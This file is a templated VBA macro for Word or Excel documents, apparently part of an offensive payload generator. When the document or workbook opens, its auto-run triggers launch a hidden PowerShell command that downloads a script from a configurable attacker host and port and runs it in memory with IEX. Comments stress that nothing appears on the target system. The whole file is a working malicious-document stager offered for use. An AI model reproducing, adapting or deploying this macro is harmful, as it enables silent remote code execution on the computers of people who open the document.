' PowerShell Stager Macro
' Downloads and executes a remote PowerShell script in memory
' Configured for: http://{{ lhost }}:{{ lport }}/{{ remote_script_path }}

Sub MyMacro()
    ' Build PowerShell download-and-execute command
    ' Uses WebClient.DownloadString to fetch remote script
    ' Pipes output to IEX (Invoke-Expression) for in-memory execution
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://{{ lhost }}:{{ lport }}/{{ remote_script_path }}') | IEX"
    
    ' Execute PowerShell with hidden window (vbHide)
    ' No console window will appear on target system
    Shell str, vbHide
End Sub

{% if office_app == "word" %}' Auto-execution trigger for Word documents
' Executes when document is opened
Sub Document_Open()
    MyMacro
End Sub

' Legacy auto-execution trigger for Word
' Provides compatibility with older Office versions
Sub AutoOpen()
    MyMacro
End Sub
{% else %}' Auto-execution trigger for Excel workbooks
' Executes when workbook is opened
Sub Workbook_Open()
    MyMacro
End Sub

' Legacy auto-execution trigger for Excel
' Provides compatibility with older Office versions
Sub Auto_Open()
    MyMacro
End Sub
{% endif %}
